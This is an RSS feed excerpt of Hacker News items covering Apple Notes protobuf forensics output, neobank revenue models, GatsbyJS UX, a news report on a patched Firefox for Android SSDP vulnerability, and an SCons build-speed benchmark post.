data-lang="python"><span>[</span><span>notta</span><span>@</span><span>cuppa</span> <span>protobuf</span><span>-</span><span>inspector</span><span>]</span><span>$</span> <span>python3</span> <span>main</span><span>.</span><span>py</span> <span>&lt;</span> <span>~/</span><span>note_18</span><span>.</span><span>blob</span> 
<span>root</span><span>:</span>
    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
        <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
        <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
        <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
            <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>"Pure blob title"</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>2</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>8</span><span>)</span>
                <span>4</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>3</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>10</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>4</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>14</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>10</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                    <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4294967295</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                    <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4294967295</span>
            <span>4</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>bytes</span> <span>(</span><span>16</span><span>)</span>
                        <span>0000</span>   <span>EE</span> <span>FE</span> <span>10</span> <span>DA</span> <span>5</span><span>A</span> <span>79</span> <span>43</span> <span>25</span> <span>88</span> <span>BA</span> <span>6</span><span>D</span> <span>CA</span> <span>E2</span> <span>E9</span> <span>B7</span> <span>EC</span>                          <span>....</span><span>ZyC</span><span>%</span><span>..</span><span>m</span><span>.....</span>
                    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>24</span><span>)</span>
                    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>9</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>3</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>3</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
          …</code></pre></figure></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/">https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/</a></em></p>]]>
            </description>
            <link>https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531472</guid>
            <pubDate>Sun, 20 Sep 2020 02:00:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Do Neobanks Make Money?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531372">thread link</a>) | @michaelm244
<br/>
September 19, 2020 | https://blog.mattheakis.com/how_do_neobanks_make_money/ | <a href="https://web.archive.org/web/*/https://blog.mattheakis.com/how_do_neobanks_make_money/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
  
  <time datetime="2020-09-15T06:52:31+00:00">15 Sep 2020</time>
  <p>Neobanks are on a tear and users are loving them. Neobanks are online-only banks, typically funded by venture capital, that piggy-back on top of an existing institution’s banking license and offer a way for customers to store/spend money. Examples include Revolut, Nubank, Chime, Simple, N26, and more. They have a real shot at becoming the mainstream banking choice for customers over the next decade. Nubank, the most popular neobank in Brazil, recently <a href="https://www.reuters.com/article/us-nubank-brazil-growth/brazilian-fintech-nubank-has-grown-to-15-million-users-ceo-idUSKBN1WQ26C" target="_blank">announced</a> that they have 15 million customers. For reference, Wells Fargo has <a href="https://google.com/" target="_blank">22 million active users</a> on its mobile app. Neobanks are a rising force and key in understanding where the financial services industry is headed.</p>

<p>But how do these neobanks make money? The imprecise answer of “they make money when you swipe their card” doesn’t tell you much. In this post, I’ll concretely show how the mechanics of a neobank’s business model works.</p>

<p>Let’s take a look at <a href="https://www.chime.com/" target="_blank">Chime</a>, the largest consumer neobank in the US. Chime’s core offering is a debit card alongside checking and savings accounts. They have nifty features like the ability to receive your paycheck two days early, no overdraft fees, and 100% mobile banking. With 60% of Americans not being able to cover a surprise $1,000 expense, a 2-day advance on a paycheck can be a huge relief for managing expenses. And the nixing of overdraft fees is a massive help for the <a href="https://www.pymnts.com/news/banking/2018/banking-overdraft-fees-cfbp-credit-unions/" target="_blank">US consumers paying a mind-boggling $34 billion/year</a> in overdraft fees. These differentiated features have led to Chime amassing <a href="https://techcrunch.com/2019/09/04/chime-now-has-5-million-customers-and-introduces-overdraft-alternative/" target="_blank">5 million customers</a> and <a href="https://www.businessinsider.com/chime-set-to-quadruple-revenue-in-2019-2019-11" target="_blank">$200 million in annualized revenue</a>.</p>

<p><strong>A neobank like Chime primarily makes money in two ways:</strong></p>

<ol>
  <li>Interchange revenue paid by payment processors (e.g., Stripe) when they process a payment for a Chime card</li>
  <li>Collecting interest from users’ deposits</li>
</ol>

<p>Although some neobanks have different revenue streams (e.g., Wealthfront charges users roboadvisor fees as a percentage of the total value of assets stored with them), interchange and deposits interest are the two largest and most common revenue streams for neobanks. These are also some of the largest revenue streams for big banks (lending though typically being the largest).</p>

<h3 id="interchange"><strong>Interchange</strong></h3>

<p>Interchange revenue is money that a card issuer (such as Chime) receives when someone swipes their card. Interchange is paid by the merchant through payment processing fees. The merchant is the party accepting a card payment in return for goods/services (e.g., your local supermarket). As an example, if a merchant uses <a href="https://stripe.com/" target="_blank">Stripe</a> for payment processing and is paying the standard <a href="https://stripe.com/pricing" target="_blank">2.9%</a> in transaction fees, Stripe will use a portion of that 2.9% to pay the card issuer.</p>

<h2><img src="https://www.helcim.com/pictures/credit-card-processing-flow-152858808066.jpg" alt="card_process"></h2>

<p>Image Credit: <a href="https://www.helcim.com/article/how-credit-card-processing-works/" target="_blank">Helcim</a></p>

<p>The specific amount paid to the card issuer depends on a number of factors and it varies for every transaction. The most important factors are:</p>

<ul>
  <li>Whether the card is debit or credit
    <ul>
      <li>Credit is significantly higher interchange</li>
    </ul>
  </li>
  <li>Whether the card has specific rewards/perks
    <ul>
      <li><a href="https://usa.visa.com/pay-with-visa/cards/visa-credit-cards/visa-infinite-credit-cards.html" target="_blank">Visa Infinite</a> (many rewards/perks) has a higher interchange rate than the standard Visa card</li>
    </ul>
  </li>
  <li>The type of the merchant for a given transaction
    <ul>
      <li>Hotels have some of the highest interchange rates</li>
    </ul>
  </li>
</ul>

<p>Ultimately the card network (e.g., Visa) decides what the interchange rates are. The key equation for an interchange revenue stream is:</p>

<p><i>avg. interchange rate * total transaction volume</i></p>

<p>In Chime’s case, their cards are on the Visa network so Visa decides how much interchange they receive. The Visa interchange rates, along with Chime’s specific rates, are <a href="https://usa.visa.com/dam/VCOM/download/merchants/visa-usa-interchange-reimbursement-fees.pdf" target="_blank">public</a> <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Depending on the type of merchant and transaction, Chime earns between 0.8% - 1.9% of a transaction’s amount, Although it’s impossible to know the exact amount of interchange Chime receives without knowing the distribution of Chime users’ spending, a reasonable guess based on aggregate consumer spending would put Chime’s average interchange rate at 1.25%<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>. This means that Chime receives around 1.25% of _all spending on their cards_. Not bad! There are still a handful of costs that Chime has to pay per transaction:</p>

<ul>
  <li>Intermediary card processors
    <ul>
      <li>Example: Chime uses <a href="https://www.galileo-ft.com/" target="_blank">Galileo</a>, which likely charges them anywhere from 0.05% - 0.4% of transaction volume</li>
    </ul>
  </li>
  <li>Fraud: if a customer loses their card and a thief spends money on it, Chime may have to cover the cost
    <ul>
      <li>Note: keep in mind that since Chime is offering debit cards, not credit cards, there is no risk of the customer not paying back Chime for transactions</li>
    </ul>
  </li>
  <li>Server costs: the server that has to process a transaction</li>
</ul>

<p>Even with these costs, Chime is still making a handsome profit per transaction. Being the card issuer, as they are here, is a very high-margin business.</p>

<h3 id="deposits-interest"><strong>Deposits Interest</strong></h3>

<p>Interest revenue is earned by a depository institution investing customer funds in low-risk securities. The depository institution typically also pays the customer for keeping their deposits at the institution. The key equation for profitability of this revenue stream is:</p>

<p><i>(% interest earned - % interest paid to depositor) * deposits amount</i></p>

<p>The <em>% interest earned</em> for neobanks is typically equal to the <a href="https://fred.stlouisfed.org/series/FEDFUNDS" target="_blank">effective federal funds rate</a>. Because the federal funds rate is constantly shifting, the profitability of this revenue stream for neobanks is constantly shifting. This is why neobanks frequently change the interest rate offered to depositors (see <a href="https://blog.wealthfront.com/category/product-news/" target="_blank">Wealthfront’s blog</a> as an example). This is a stark contrast to big banks however. A key benefit of a banking charter is that banks can lend out a multiple of their deposits as loans (e.g., mortgages, business loans). This amount is referred to as net interest margin, and is typically much higher than the federal funds rate - <a href="https://www.investopedia.com/ask/answers/061715/what-net-interest-margin-typical-bank.asp" target="_blank">it was 3.3% on average for banks in 2018</a>. The _% interest paid to depositor* is how much the depositor earns by storing their funds with the institution, and is set by the depository institution. For the recent wave of high-yield accounts offered by neobanks, they’ve set <em>% interest paid to depositor</em> essentially equal to *% interest earned_, making this revenue stream’s profitability close to zero. The typical rationale is for the high-yield account to draw in consumers for other higher-margin products such as debit/credit cards or loans.</p>

<p>In Chime’s case, <em>% interest earned</em> (the federal funds rate) is 0.09% at the time of writing (Sept. 2020), and <a href="https://chime.zendesk.com/hc/en-us/articles/221487887-What-do-I-need-to-know-about-the-Chime-Savings-Account-" target="_blank"><em>% interest paid to depositor</em></a> is 1.00%. This means that Chime is actually losing money on their deposit account product, and likely using it as a <a href="https://en.wikipedia.org/wiki/Loss_leader" target="_blank">loss leader</a> for the debit card, which has far higher profit margins. Also note that Chime only gives depositors 1% in interest for funds in their savings account. For any funds in the checking account (which over all customers may be larger), no interest is given.</p>

<p>These are the two main revenue streams for the majority of neobanks, but there are also others such as <a href="https://en.wikipedia.org/wiki/Cross-selling" target="_blank">cross-selling</a>, <a href="https://www.svmcards.com/" target="_blank">reward redemption referrals</a>, and new ones being created by startups. Hopefully this has given you a grasp of the basics, let me know if you have any thoughts/questions below!</p>




  <br>
  
  
  
</article>

      </div></div>]]>
            </description>
            <link>https://blog.mattheakis.com/how_do_neobanks_make_money/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531372</guid>
            <pubDate>Sun, 20 Sep 2020 01:29:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The UX Reasons Why GatsbyJS Will Win Long Term]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531185">thread link</a>) | @taphangum
<br/>
September 19, 2020 | https://planflow.dev/blog/5-ux-reasons-why-gatsby-will-win | <a href="https://web.archive.org/web/*/https://planflow.dev/blog/5-ux-reasons-why-gatsby-will-win">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>The Emergence Of Front End Frameworks</h2><p>The increasing complexity of the web has led to a rise in demand for tools that appropriately respond to and manage that complexity.</p><p>This complexity has been felt not just by the user (in the form of more information filled, dynamic UI’s), but by the people who are trying to build the tools that manage that complexity (the developers) as well.</p><p>The best tools that have come to the forefront, which have succeeded in managing complexity on both sides of the table, have been Front End Frameworks.</p><p>On the user’s end, the usage of Front End Framework’s has led to dramatically faster load times, as well as more responsive UI’s. Making the increased information that now needs to be handled by them, much easier to deal with.</p><p>On the developer’s side, the use of Front End Frameworks (and the resource that is the vast ecosystems within them) has given them immense leverage, by not having to reinvent the wheels that handle a lot of the complex actions that need to be done on the modern web. It has also allowed developers to no longer have to worry about their feature choices slowing down the site, as the ‘build’ process has offloaded the majority of the heavy lifting away from the browser or any servers that would be connected to it.</p><p>Overall, Front End Frameworks have now become a serious consideration for any new project that is intended for the modern web.</p><h2>The Emergence Of GatsbyJS</h2><p>Among the many Front End Frameworks that have popped up over the last few years, a few have stood out among the rest as being the ideal choice for the vast majority of use cases.</p><p>One that has begun to stand out, in particular, has been <a target="_blank" title="GatsbyJS" href="https://gatsbyjs.com/">GatsbyJS</a>.</p><p>It is a framework that I am personally a big fan of, though I have, <a target="_blank" title="https://jaredpalmer.com/gatsby-vs-nextjs" href="https://jaredpalmer.com/gatsby-vs-nextjs">as with many others</a>, had my fair share of frustrations with it<a target="_blank" title="https://jaredpalmer.com/gatsby-vs-nextjs" href="https://jaredpalmer.com/gatsby-vs-nextjs"></a>. Despite this, there are a few key UX reasons that I believe will make it the biggest player in the Front End Framework space within the next few years.</p><p>Below I will outline what those UX reasons are and why they are crucial to the adoption of Gatsby over other frameworks in the future.</p><h3><strong>The 5 UX reasons why Gatsby will win long term</strong></h3><h4><strong>1. A FAST installation experience (with the ability to use templates!)</strong></h4><p>The first thing that caught my attention when I first came across and used Gatsby for the first time was just how easy it was to get something up and running.&nbsp;</p><p>A simple installation of the Gatsby CLI 'npm install -g gatsby-cli', followed by a Gatsby creation command that pulled from any relevant repo I wanted (<strong>as a template</strong>) 'gatsby&nbsp;new&nbsp;my-tailwind-starter&nbsp;https://github.com/PlanFlowDev/Simplicity-Itself-Gatsby-Tailwind-Starter-Theme', was enough to get me a project setup. Once installed, to run it, all I had to do was run ‘gatsby develop’ within my project directory.&nbsp;</p><p>Everything just worked. And I was ready to go quickly.&nbsp;</p><p>The ability to get up and running quickly with a template was key to making this experience both unique and very satisfying.&nbsp;</p><p>In terms of UX, having to ‘start from scratch’ is one of the worst, yet mostly unknown UX mistakes that most new technologies make when trying to attract new users.&nbsp;</p><p>The more you can reduce the overhead to getting the user to a <a target="_blank" title="Kathy Sierra - Badass - Making Users Awesome" href="https://www.youtube.com/watch?v=3fpHYm6kTik">satisfied state of ‘having something’,</a> the better adoption rates you’ll see.&nbsp;</p><p>Gatsby’s fast installation with the ability (even encouragement) to use a template, does this well.</p><h4><strong>2. A fast-growing ecosystem (plugins and themes)</strong></h4><p>Getting up and running with new technology is always a situation that requires learning and the use of additional resources, to help make the integration process easier, both mentally and with the technology itself.</p><p>The size and activity of the ecosystem that supports and underpins a technology is key to assisting rapid adoption and a positive experience for the users.</p><p>The momentum that an active and growing community also makes people very forgiving of errors and mishaps with the technology, which are inevitable, and keeps the plugins, themes, and projects coming because people can usually find solutions (ie. via StackOverflow or Reddit) to their problems as they’re building.</p><p>Gatsby, of all the Front End Frameworks I’ve seen, especially for building static sites, has the best community.</p><h4><strong>3. Easy to read documentation</strong></h4><p>When you find yourself on the documentation page of the technology you’re using more often than other sources (very common in web dev), you can be sure that that technology has pretty good documentation. Usually, there are many alternatives to technology’s own official docs for most use cases (StackOverflow being one big one). Finding yourself on the official docs more often than not is a good sign.</p><p>I find Gatsby’s docs a lot better than the docs I’ve found in a few other Front End Frameworks.&nbsp;</p><p>Gatsby docs are a lot less jargon-filled and easier to parse. This, even when you are a developer who can understand the jargon, is a massive benefit.&nbsp;</p><h4><strong>4. A unique design aesthetic that stands out</strong></h4><p>Most frameworks have forgettable designs.</p><p>My guess is that this is partly down to the developer’s focus on how it works rather than how it looks.</p><p>Gatsby seems to take a different approach. It’s hard to forget Gatsby’s big purple G once you see it, along with its overall very well designed and consistent website design and general branding.&nbsp;</p><p>This is bigger than people think when it comes to user adoption (which is the most important UX consideration for new technologies), particularly within the front end development space, where the overlap of design and development is only becoming more obvious.</p><p>Gatsby is the clear winner in this space.&nbsp;</p><h4><strong>5. Strong alignments (bundling) with other key, fast-growing technologies (GraphQL, ReactJS)</strong></h4><p>Since the beginning of the software industry, bundling has been a key method of growing the market share of individual pieces of software. For the most part, software needs a lot of other parts to work functionally, so the logic behind also selling them together conceptually is a natural extension.&nbsp;</p><p>Microsoft, the largest software company in the world, became (in a <a target="_blank" title="https://www.ozy.com/true-and-stories/the-agreement-that-catapulted-microsoft-over-ibm/94437/" href="https://www.ozy.com/true-and-stories/the-agreement-that-catapulted-microsoft-over-ibm/94437/">now infamous</a> deal) what it is today by bundling its MS-Dos operating system with an early IBM desktop machine.</p><p>Apple’s launch of the iPhone, and its eventual dominance in the market was largely fueled by its bundling of its phone with the millions of applications that developers ultimately filled within their app store.&nbsp;</p><p>Within the Front End Framework space, Gatsby has done a very good job of bundling itself with GraphQL. Most searches of GraphQL on Google and YouTube very often pull up a Gatsby related tutorial, which means that in some small way, they are beginning to become synonymous. Even more so than other frameworks have managed to so far.</p><p>Gatsby’s close association with the React community has also done a lot to propel its position within the Front End Framework space.</p><h4><strong>UX Determines Adoption, Adoption Determines Success</strong></h4><p>Ultimately, among the many Front End Frameworks that exist, Gatsby is built in the right way to succeed. Having hit a lot of the key UX points outlined above, it is the choice I’d most highly recommend for a Front End Developer looking for the right framework to use for your next project.</p></div></div>]]>
            </description>
            <link>https://planflow.dev/blog/5-ux-reasons-why-gatsby-will-win</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531185</guid>
            <pubDate>Sun, 20 Sep 2020 00:32:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Bug Could Let Attackers Hijack Firefox for Android via Wi-Fi Network]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530986">thread link</a>) | @assineproff
<br/>
September 19, 2020 | http://tech.thewebgangs.com/a-bug-could-let-attackers-hijack-firefox-for-android-via-wi-fi-network/ | <a href="https://web.archive.org/web/*/http://tech.thewebgangs.com/a-bug-could-let-attackers-hijack-firefox-for-android-via-wi-fi-network/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tps_slideContainer_1237"><div>

<p>Dear Android users, if you use the Firefox web browser on your smartphones, make sure it has been updated to version 80 or the latest available version on the Google Play Store.</p>

<p>ESET security researcher Lukas Stefanko yesterday&nbsp;<a href="https://twitter.com/LukasStefanko/status/1307013106615418883" target="_blank" rel="noopener noreferrer">tweeted</a>&nbsp;an alert demonstrating the exploitation of a recently disclosed high-risk remote command execution vulnerability affecting the Firefox app for Android.</p>

<p>Discovered originally by Australian security researcher&nbsp;<a href="https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-tech-notes/-/tree/master/firefox-android-2020" target="_blank" rel="noopener noreferrer">Chris Moberly</a>, the vulnerability resides in the SSDP engine of the browser that can be exploited by an attacker to target Android smartphones connected to the same Wi-Fi network as the attacker, with Firefox app installed.</p>
<p>SSDP, stands for Simple Service Discovery Protocol, is a UDP based protocol that is a part of UPnP for finding other devices on a network. In Android, Firefox periodically sends out SSDP discovery messages to other devices connected to the same network, looking for second-screen devices to cast.</p>
<p>Any device on the local network can respond to these broadcasts and provide a location to obtain detailed information on a UPnP device, after which, Firefox attempts to access that location, expecting to find an XML file conforming to the UPnP specifications.</p>

<p>According to the vulnerability report Moberly submitted to the Firefox team, the SSDP engine of the victims’ Firefox browsers can be tricked into triggering an Android intent by simply replacing location of the XML file in the response packets with a specially crafted message pointing to an Android intent URI.</p>
<p>For this, an attacker connected to a targeted Wi-Fi network can run a malicious SSDP server on his/her device and trigger intent-based commands on nearby Android devices through Firefox—without requiring any interaction from the victims.</p>
<p>Activities allowed by the intent also includes automatically launching the browser and open any defined URL, which, according to the researchers, is sufficient to trick victims into providing their credentials, install malicious apps, and other malicious activities based on the surrounding scenarios.</p>
<p>“The target simply has to have the Firefox application running on their phone. They do not need to access any malicious websites or click any malicious links. No attacker-in-the-middle or malicious app installation is required. They can simply be sipping coffee while on a cafe’s Wi-Fi, and their device will start launching application URIs under the attacker’s control,” Moberly said.</p>

<p>“it could have been used in a way similar to phishing attacks where a malicious site is forced onto the target without their knowledge in the hopes they would enter some sensitive info or agree to install a malicious application.”</p>
<p>Moberly reported this vulnerability to the Firefox team a few weeks back, which the browser maker has now patched in the Firefox for Android versions 80 and later.</p>
<p>Moberly has also released a&nbsp;<a href="https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-tech-notes/-/blob/master/firefox-android-2020/ffssdp.py" target="_blank" rel="noopener noreferrer">proof-of-concept exploit</a>&nbsp;to the public that Stefanko used to demonstrate the issue in the above video against three devices connected to the same network.</p>

</div></div></div>]]>
            </description>
            <link>http://tech.thewebgangs.com/a-bug-could-let-attackers-hijack-firefox-for-android-via-wi-fi-network/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530986</guid>
            <pubDate>Sat, 19 Sep 2020 23:34:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SCons Is Still Slow]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24530845">thread link</a>) | @luu
<br/>
September 19, 2020 | https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/ | <a href="https://web.archive.org/web/*/https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div>
					
					<!-- .entry-header -->

											<div>
							<p>A while back I posted a series of articles exploring the scalability of SCons, a popular Python-based build tool.  In a nutshell, my experiments showed that <b>SCons exhibits roughly quadratic growth in build runtimes as the number of targets increases</b>:</p>
<ul>
<li><a href="https://blog.melski.net/2011/05/23/why-is-scons-so-slow/">Why is SCons so slow?</a></li>
<li><a href="http://www.electric-cloud.com/blog/2010/03/08/how-scalable-is-scons/">How scalable is SCons?</a></li>
<li><a href="http://www.electric-cloud.com/blog/2010/07/21/a-second-look-at-scons-performance/">A second look at SCons performance</a></li>
<li><a href="http://www.electric-cloud.com/blog/2010/08/11/the-last-word-on-scons-performance/">The last word on SCons performance</a></li>
</ul>
<p>
Recently Dirk Baechle attempted to rebut my findings in an entry on the SCons wiki:  <a href="http://scons.org/wiki/WhySconsIsNotSlow">Why SCons is not slow</a>.  I thought Dirk made some credible suggestions that could explain my results, and he did some smart things in his effort to invalidate my results.  Unfortunately, his methods were flawed and his conclusions are invalid.  My original results still stand: <b>SCons really is slow.</b>  In the sections that follow I’ll share my own updated benchmarks and show where Dirk’s analysis went wrong.</p>
<h3>Test setup</h3>
<p>
As before, I used <a href="https://github.com/emelski/scons_bench/blob/master/genscons.pl">genscons.pl</a> to generate sample builds ranging from 2,000 to 50,000 targets.  However, my test system was much beefier this time:</p>
<table>
<tbody><tr>
<th></th>
<th>2013</th>
<th>2010</th>
</tr>
<tr>
<th>OS</th>
<td>Linux Mint 14 (kernel version 3.5.0-17-generic)</td>
<td>RedHat Desktop 3 (kernel version 2.4.21-58.ELsmp)</td>
</tr>
<tr>
<th>CPU</th>
<td>Quad 1.7GHz Intel Core i7, hyperthreaded</td>
<td>Dual 2.4GHz Intel Xeon, hyperthreaded</td>
</tr>
<tr>
<th>RAM</th>
<td>16 GB</td>
<td>2 GB</td>
</tr>
<tr>
<th>HD</th>
<td>SSD</td>
<td>(unknown)</td>
</tr><tr>
<th>SCons</th>
<td>2.3.0</td>
<td>1.2.0.r3842</td>
</tr>
